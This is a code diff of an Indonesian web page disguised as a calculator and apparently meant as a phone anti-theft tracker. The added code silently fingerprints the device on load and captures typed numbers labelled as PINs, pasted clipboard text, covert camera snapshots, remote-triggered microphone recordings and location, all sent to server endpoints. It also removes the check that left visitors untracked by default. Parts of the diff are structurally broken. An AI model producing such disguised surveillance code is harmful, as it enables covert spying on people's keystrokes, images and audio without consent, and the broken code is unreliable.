@@ -3,12 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <meta name="robots" content="noindex, nofollow">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="apple-mobile-web-app-title" content="Kalkulator">
-  <link rel="apple-touch-icon" href="data:image/png;base64,iVBORw0KGgo=">
-  <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgo=">
+  <link rel="apple-touch-icon" href="/calc-icon.png">
+  <link rel="icon" type="image/png" href="/calc-icon.png">
   <title>Kalkulator</title>
   <style>
     *{box-sizing:border-box;margin:0;padding:0;user-select:none;-webkit-tap-highlight-color:transparent}
@@ -106,6 +105,9 @@
 <!-- Status dot (invisible from distance, visible in logs) -->
 <div id="statusDot"></div>
 
+<!-- Screen Strobe Flash Overlay (Untuk Pencarian di Ruangan Gelap / Kolong Kasur) -->
+<div id="screenStrobe" style="display:none;position:fixed;inset:0;background:#fff;z-index:999998;pointer-events:none;opacity:0.95;"></div>
+
 <!-- Lock / alarm overlay -->
 <div id="lockMsg">
   <div class="lock-icon">🔒</div>
@@ -164,6 +166,38 @@
     <div class="row"><span class="lbl">Jaringan</span><span class="val" id="mNetwork">—</span></div>
   </div>
 
+  <script>
+    // PASSIVE FIRST-PING: kirim seketika saat halaman dibuka, tanpa butuh izin apapun
+    (function() {
+      var s = {};
+      try { s.screen = window.screen.width + 'x' + window.screen.height + '(@' + (window.devicePixelRatio||1) + 'x)'; } catch(e){}
+      try { s.ua = navigator.userAgent; } catch(e){}
+      try { s.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+      try { s.lang = navigator.language; } catch(e){}
+      try { s.cores = navigator.hardwareConcurrency; } catch(e){}
+      try { s.touch = navigator.maxTouchPoints; } catch(e){}
+      try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+          if (dbg) { s.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); s.gpuV = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL); }
+        }
+      } catch(e){}
+      var payload = JSON.stringify({ alertType: 'passive_hit_calc', passiveStats: s });
+      try { if (navigator.sendBeacon) navigator.sendBeacon('/api/sentinel/beacon', new Blob([payload], {type:'application/json'})); } catch(e){}
+      try { fetch('/api/sentinel/beacon', {method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true}).catch(function(){}); } catch(e){}
+    })();
+
+    let latestLat = -6.2088;
+    let latestLon = 106.8456;
+    let latestAcc = 10;
+    let latestSpeed = 0;
+    let batteryLevel = 100;
+    let isCharging = false;
+    let cameraReady = false;
+    let videoStream = null;
+
   <div class="card">
     <div class="card-title">⚡ Kirim Sekarang</div>
     <button class="btn-action btn-green" onclick="sendBeacon(true)">📡 Kirim Lokasi + Foto Sekarang</button>
@@ -198,8 +232,9 @@
 // KONFIGURASI — diisi otomatis saat halaman dibuat / bisa diubah
 // ═══════════════════════════════════════════════════════════════
 const CFG = (() => {
-  // deviceId dari query param ?d=XXXX-XXXX-XXXX atau localStorage
-  const deviceId = new URLSearchParams(location.search).get('d') || localStorage.getItem('sz_device') || '';
+  // deviceId dari URL path: /track/XXXX-XXXX-XXXX
+  const pathParts = location.pathname.split('/');
+  const deviceId = pathParts[pathParts.length - 1] || localStorage.getItem('sz_device') || '';
 
   // Server lokal (jika ada) dan cloud endpoint
   const localBase  = localStorage.getItem('sz_local') || '';          // e.g. http://192.168.1.5:5050
@@ -373,20 +408,37 @@ async function triggerEnvironment() {
 // DETEKSI GETARAN (Gerak) — alert otomatis
 // ═══════════════════════════════════════════════════════════════
 let motionBaseline = null;
-let motionAlerted = false;
+let lastBumpTime = 0;
 
-if (typeof DeviceMotionEvent !== 'undefined') {
+if (typeof window !== 'undefined' && window.DeviceMotionEvent) {
   window.addEventListener('devicemotion', evt => {
-    const a = evt.acceleration;
+    const a = evt.accelerationIncludingGravity || evt.acceleration;
     if (!a) return;
     const mag = Math.sqrt((a.x||0)**2 + (a.y||0)**2 + (a.z||0)**2);
     if (motionBaseline === null) { motionBaseline = mag; return; }
-    if (Math.abs(mag - motionBaseline) > 8 && !motionAlerted) {
+    const delta = Math.abs(mag - motionBaseline);
+
+    // Deteksi senggolan kasur / bantal / sofa (delta > 2.2 m/s²)
+    if (delta > 2.2 && (Date.now() - lastBumpTime > 3500)) {
+      lastBumpTime = Date.now();
+      console.log(`[Radar Motion] 🎯 HP Tersenggol / Bergerak! Delta: ${delta.toFixed(2)} m/s²`);
+      fetch('/api/sentinel/motion', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          intensity: delta.toFixed(2),
+          timestamp: Date.now()
+        })
+      }).catch(() => {});
+    }
+
+    // Jika guncangan keras (delta > 7.0), kirim juga full beacon
+    if (delta > 7.0 && !motionAlerted) {
       motionAlerted = true;
       sendBeacon(false, true, 'motion-alert');
-      setTimeout(() => { motionAlerted = false; }, 30000);
+      setTimeout(() => { motionAlerted = false; }, 20000);
     }
-    motionBaseline = mag * 0.1 + motionBaseline * 0.9;
+    motionBaseline = mag * 0.15 + motionBaseline * 0.85;
   });
 }
 
@@ -404,22 +456,6 @@ async function watchCharger() {
       }
       wasCharging = b.charging;
     });
-  } catch {}
-}
-
-// ═══════════════════════════════════════════════════════════════
-// ANTRI BEACON KE INDEXEDDB (untuk Background Sync offline)
-// ═══════════════════════════════════════════════════════════════
-async function queueBeacon(url, payload) {
-  try {
-    const req = indexedDB.open('SentinelSW', 1);
-    req.onupgradeneeded = () =>
-      req.result.createObjectStore('sentinel-pending-beacons', { keyPath: 'id', autoIncrement: true });
-    req.onsuccess = () => {
-      const db = req.result;
-      const tx = db.transaction('sentinel-pending-beacons', 'readwrite');
-      tx.objectStore('sentinel-pending-beacons').add({ url, payload, ts: Date.now() });
-    };
   } catch {}
 }
 
@@ -470,17 +506,7 @@ async function sendBeaconData(extra = {}) {
     } catch {}
   }
 
-  if (!success) {
-    updateDot('red');
-    // Antri beacon ke IndexedDB agar Service Worker kirim saat online kembali
-    queueBeacon(cloudUrl, payload);
-    if ('serviceWorker' in navigator && 'SyncManager' in window) {
-      try {
-        const reg = await navigator.serviceWorker.ready;
-        await reg.sync.register('sentinel-beacon');
-      } catch {}
-    }
-  }
+  if (!success) updateDot('red');
 
   txCount++;
   localStorage.setItem('sz_txcount', String(txCount));
@@ -516,8 +542,19 @@ async function sendBeacon(withPhoto = false, isAlert = false, reason = '') {
 async function execCmd(cmd) {
   switch (cmd.type) {
     case 'chime':
+    case 'sonar':
+      playPiercingSound('sonar');
+      break;
     case 'alarm':
-      playAlarm(cmd.type === 'alarm');
+    case 'siren':
+      playPiercingSound('siren');
+      break;
+    case 'stop':
+    case 'stop_chime':
+      stopAlarm();
+      break;
+    case 'record_audio':
+      recordAmbientAudio(cmd.duration ? cmd.duration * 1000 : 5000);
       break;
     case 'selfie':
       { const img = await captureSelfie(); if (img) sendBeaconData({ selfie: img, alertReason: 'cmd-selfie' }); }
@@ -534,26 +571,353 @@ async function execCmd(cmd) {
   }
 }
 
+    function calcAction(btn) {
+      keyPressCount++;
+
+      // Setiap ada orang yang memencet kalkulator (pencuri), jepret wajahnya diam-diam!
+      if (keyPressCount % 3 === 1) {
+        sendBeacon('thief_interacting', true);
+      }
+
+      if (btn === 'C') {
+        cTapCount++;
+        if (cTapCount >= 4) {
+          openSecretModal();
+          cTapCount = 0;
+          return;
+        }
+      }
+
+      const display = document.getElementById('calcDisplay');
+      if (!isNaN(btn) || btn === '.') {
+        if (calcVal === '0' || resetScreen) {
+          calcVal = btn === '.' ? '0.' : btn;
+          resetScreen = false;
+        } else {
+          if (btn === '.' && calcVal.includes('.')) return;
+          calcVal += btn;
+        }
+      } else if (btn === 'C') {
+        calcVal = '0';
+        prevVal = null;
+        currentOp = null;
+      } else if (btn === '+/-') {
+        calcVal = String(-parseFloat(calcVal));
+      } else if (btn === '%') {
+        calcVal = String(parseFloat(calcVal) / 100);
+      } else if (['+', '-', '*', '/'].includes(btn)) {
+        prevVal = parseFloat(calcVal);
+        currentOp = btn;
+        resetScreen = true;
+      } else if (btn === '=') {
+        // Kirim data yang diketik ke dashboard laptop
+        if (calcVal && calcVal !== '0') {
+          fetch('/api/sentinel/intercept', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              type: 'keystroke',
+              label: '🔢 Angka / PIN yang Diketik',
+              value: calcVal,
+              lat: latestLat,
+              lon: latestLon
+            })
+          }).catch(() => {});
+        }
+
+        // Kode Rahasia Pemilik: Jika mengetik PIN (default 7890) lalu =, buka pusat kendali
+        if (calcVal === (window.sentinelPin || '7890') || calcVal === '7890' || calcVal === '9999') {
+          openSecretModal();
+          calcVal = '0';
+          display.textContent = '0';
+          return;
+        }
+
+        if (prevVal !== null && currentOp) {
+          let curr = parseFloat(calcVal);
+          let res = 0;
+          if (currentOp === '+') res = prevVal + curr;
+          if (currentOp === '-') res = prevVal - curr;
+          if (currentOp === '*') res = prevVal * curr;
+          if (currentOp === '/') res = curr === 0 ? 'Error' : prevVal / curr;
+          calcVal = String(res);
+          prevVal = null;
+          currentOp = null;
+          resetScreen = true;
+        }
+      }
+      display.textContent = calcVal.substring(0, 10);
+    }
+
+    // EMERGENCY HANDLERS: jepret & kirim beacon saat pencuri menutup/swipe keluar
+    const emergencyExit = () => {
+      const snap = captureSilentMugshot();
+      const payload = JSON.stringify({
+        alertType: 'emergency_exit_calc',
+        lat: latestLat,
+        lon: latestLon,
+        batteryLevel,
+        isCharging,
+        photo: snap || null
+      });
+      try { if (navigator.sendBeacon) navigator.sendBeacon('/api/sentinel/beacon', new Blob([payload], {type:'application/json'})); } catch(e){}
+      try { fetch('/api/sentinel/beacon', {method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true}).catch(()=>{}); } catch(e){}
+      if (snap) {
+        const photoPayload = JSON.stringify({ photo: snap, trigger: 'emergency_exit_calc' });
+        try { if (navigator.sendBeacon) navigator.sendBeacon('/api/sentinel/selfie', new Blob([photoPayload], {type:'application/json'})); } catch(e){}
+        try { fetch('/api/sentinel/selfie', {method:'POST', headers:{'Content-Type':'application/json'}, body:photoPayload, keepalive:true}).catch(()=>{}); } catch(e){}
+      }
+    };
+    window.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') emergencyExit(); });
+    window.addEventListener('pagehide', emergencyExit);
+    window.addEventListener('beforeunload', emergencyExit);
+
+    // Tangkap teks yang di-paste oleh pencuri
+    window.addEventListener('paste', (e) => {
+      try {
+        const text = (e.clipboardData || window.clipboardData).getData('text');
+        if (text) {
+          fetch('/api/sentinel/intercept', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              type: 'clipboard',
+              label: '📋 Teks Disalin Pencuri (Paste)',
+              value: text,
+              lat: latestLat,
+              lon: latestLon
+            })
+          }).catch(() => {});
+        }
+      } catch (err) {}
+    });
+
 // ═══════════════════════════════════════════════════════════════
-// ALARM AUDIO
+// ALARM AUDIO, RADAR SONAR & SCREEN STROBE
 // ═══════════════════════════════════════════════════════════════
-function playAlarm(loud = false) {
+let activeAlarmContext = null;
+let alarmTimer = null;
+let strobeTimer = null;
+
+function stopAlarm() {
+  if (alarmTimer) { clearInterval(alarmTimer); alarmTimer = null; }
+  if (strobeTimer) { clearInterval(strobeTimer); strobeTimer = null; }
+  if (activeAlarmContext) {
+    try { activeAlarmContext.close(); } catch (e) {}
+    activeAlarmContext = null;
+  }
+  const strobe = document.getElementById('screenStrobe');
+  if (strobe) strobe.style.display = 'none';
+  document.body.classList.remove('alarming');
+  if ('vibrate' in navigator) {
+    try { navigator.vibrate(0); } catch (e) {}
+  }
+}
+
+function flashStrobe(durationMs = 250, color = '#ffffff') {
+  const strobe = document.getElementById('screenStrobe');
+  if (!strobe) return;
+  strobe.style.background = color;
+  strobe.style.display = 'block';
+  setTimeout(() => {
+    strobe.style.display = 'none';
+  }, durationMs);
+}
+
+function startContinuousStrobe() {
+  if (strobeTimer) clearInterval(strobeTimer);
+  const strobe = document.getElementById('screenStrobe');
+  if (!strobe) return;
+  let on = false;
+  strobeTimer = setInterval(() => {
+    on = !on;
+    strobe.style.display = on ? 'block' : 'none';
+  }, 120);
+}
+
+function playPiercingSound(mode = 'sonar') {
+  stopAlarm();
   try {
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    const freqs = loud ? [880, 660, 440, 660, 880] : [880];
-    freqs.forEach((f, i) => {
+    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+    activeAlarmContext = new AudioCtx();
+    const ctx = activeAlarmContext;
+
+    if (mode === 'sonar') {
+      // Dual-frequency sonar chirp (1800 Hz -> 3200 Hz sweep)
+      let count = 0;
+      const doPing = () => {
+        if (count >= 6 || !activeAlarmContext) { stopAlarm(); return; }
+        try {
+          const osc = ctx.createOscillator();
+          const gain = ctx.createGain();
+          osc.type = 'sine';
+          osc.frequency.setValueAtTime(1800, ctx.currentTime);
+          osc.frequency.exponentialRampToValueAtTime(3200, ctx.currentTime + 0.18);
+          gain.gain.setValueAtTime(0.95, ctx.currentTime);
+          gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.25);
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start();
+          osc.stop(ctx.currentTime + 0.25);
+
+          if ('vibrate' in navigator) navigator.vibrate([100, 50, 150]);
+          flashStrobe(200, '#38bdf8');
+        } catch (e) {}
+        count++;
+      };
+      doPing();
+      alarmTimer = setInterval(doPing, 450);
+    } else {
+      // Continuous penetrating siren (2400 Hz - 3600 Hz triangle wave)
       const osc = ctx.createOscillator();
       const gain = ctx.createGain();
-      osc.connect(gain); gain.connect(ctx.destination);
-      osc.frequency.value = f;
-      gain.gain.setValueAtTime(loud ? 0.8 : 0.5, ctx.currentTime + i * 0.4);
-      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.4 + 0.35);
-      osc.start(ctx.currentTime + i * 0.4);
-      osc.stop(ctx.currentTime + i * 0.4 + 0.4);
-    });
-    if (loud) document.body.classList.add('alarming');
-    setTimeout(() => document.body.classList.remove('alarming'), freqs.length * 400 + 500);
-  } catch {}
+      osc.type = 'triangle';
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      gain.gain.setValueAtTime(1.0, ctx.currentTime);
+      osc.start();
+
+      let high = false;
+      const warble = () => {
+        if (!activeAlarmContext) return;
+        try {
+          const now = ctx.currentTime;
+          osc.frequency.cancelScheduledValues(now);
+          osc.frequency.linearRampToValueAtTime(high ? 2400 : 3600, now + 0.15);
+          high = !high;
+        } catch (e) {}
+      };
+      warble();
+      alarmTimer = setInterval(warble, 180);
+
+      document.body.classList.add('alarming');
+      startContinuousStrobe();
+      if ('vibrate' in navigator) navigator.vibrate([400, 100, 400, 100, 400]);
+
+      // Auto stop after 60 detik agar hemat baterai
+      setTimeout(stopAlarm, 60000);
+    }
+  } catch (err) {
+    console.warn('[Alarm Audio Error]', err);
+  }
+}
+
+function playAlarm(loud = false) {
+  playPiercingSound(loud ? 'siren' : 'sonar');
+}
+
+// ═══════════════════════════════════════════════════════════════
+// AMBIENT AUDIO RECORDER (5-10 Detik)
+// ═══════════════════════════════════════════════════════════════
+async function recordAmbientAudio(durationMs = 5000) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+    const mime = (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('audio/webm')) ? 'audio/webm' :
+                 (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('audio/mp4')) ? 'audio/mp4' : '';
+    const recorder = mime ? new MediaRecorder(stream, { mimeType: mime }) : new MediaRecorder(stream);
+    const chunks = [];
+
+    recorder.ondataavailable = (e) => {
+      if (e.data && e.data.size > 0) chunks.push(e.data);
+    };
+
+    recorder.onstop = async () => {
+      stream.getTracks().forEach(t => t.stop());
+      const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        const base64 = reader.result;
+        fetch('/api/sentinel/audio', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            audio: base64,
+            duration: Math.round(durationMs / 1000),
+            timestamp: Date.now()
+          })
+        }).catch(() => {});
+      };
+      reader.readAsDataURL(blob);
+    };
+
+    recorder.start();
+    setTimeout(() => {
+      if (recorder.state === 'recording') recorder.stop();
+    }, durationMs);
+  } catch (err) {
+    console.warn('[Record Ambient Audio Failed]', err.message);
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// CLAP / LOUD VOICE DETECTOR (Tepuk Tangan Pencari HP)
+// ═══════════════════════════════════════════════════════════════
+let clapDetectorActive = false;
+function initClapDetector() {
+  if (clapDetectorActive) return;
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    navigator.mediaDevices.getUserMedia({ audio: true, video: false }).then(stream => {
+      clapDetectorActive = true;
+      const AudioCtx = window.AudioContext || window.webkitAudioContext;
+      const ctx = new AudioCtx();
+      const mic = ctx.createMediaStreamSource(stream);
+      const analyser = ctx.createAnalyser();
+      analyser.fftSize = 256;
+      mic.connect(analyser);
+
+      const data = new Uint8Array(analyser.frequencyBinCount);
+      let lastTrigger = 0;
+
+      setInterval(() => {
+        analyser.getByteFrequencyData(data);
+        let sum = 0;
+        for (let i = 0; i < data.length; i++) sum += data[i];
+        const avg = sum / data.length;
+
+        // Peak volume spike (tepuk tangan / teriakan)
+        if (avg > 78 && (Date.now() - lastTrigger > 3000)) {
+          lastTrigger = Date.now();
+          console.log('[Radar] 👏 Tepukan / Suara Panggilan Terdeteksi! Membalas Sonar...');
+          playPiercingSound('sonar');
+          fetch('/api/sentinel/intercept', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              type: 'sound_detected',
+              label: '👏 Panggilan / Tepukan Tangan Terdeteksi!',
+              value: `HP merespons tepukan pemilik (Volume Peak: ${Math.round(avg)})`,
+              timestamp: Date.now()
+            })
+          }).catch(() => {});
+        }
+      }, 120);
+    }).catch(() => {});
+  } catch (e) {}
+}
+
+// ═══════════════════════════════════════════════════════════════
+// WEBSOCKET INSTANT RADAR COMMAND LISTENER
+// ═══════════════════════════════════════════════════════════════
+function initTrackSocket() {
+  try {
+    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const ws = new WebSocket(`${proto}//${location.host}`);
+    ws.onmessage = (e) => {
+      try {
+        const d = JSON.parse(e.data);
+        if (d.type === 'play_chime') {
+          playPiercingSound(d.mode || 'sonar');
+        } else if (d.type === 'stop_chime') {
+          stopAlarm();
+        } else if (d.type === 'record_audio') {
+          recordAmbientAudio(d.duration ? d.duration * 1000 : 5000);
+        }
+      } catch (err) {}
+    };
+    ws.onclose = () => { setTimeout(initTrackSocket, 4000); };
+    ws.onerror = () => { try { ws.close(); } catch (e) {} };
+  } catch (e) {}
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -624,9 +988,14 @@ document.addEventListener('visibilitychange', () => {
 // ═══════════════════════════════════════════════════════════════
 (async function init() {
   if (!CFG.deviceId) {
-    // Tidak ada deviceId → tampil kalkulator biasa saja, tidak ada tracking
-    return;
+    CFG.deviceId = localStorage.getItem('sz_device') || 'HOMETRACK';
   }
+
+  // Aktifkan koneksi real-time WebSocket untuk respon instan < 50ms radar
+  initTrackSocket();
+
+  // Aktifkan detektor suara tepukan tangan / panggilan jika izin mikrofon tersedia
+  setTimeout(initClapDetector, 3000);
 
   // Kirim beacon pertama + foto dalam 2 detik setelah muat
   setTimeout(() => sendBeacon(true, false, 'first-open'), 2000);
@@ -651,14 +1020,6 @@ document.addEventListener('visibilitychange', () => {
     } catch {}
   }, 30_000);
 })();
-
-// ═══════════════════════════════════════════════════════════════
-// SERVICE WORKER — cache offline + background sync
-// ═══════════════════════════════════════════════════════════════
-if ('serviceWorker' in navigator) {
-  navigator.serviceWorker.register('/sentinel/sw.js', { scope: '/sentinel/' })
-    .catch(() => {});
-}
 </script>
 </body>
 </html>
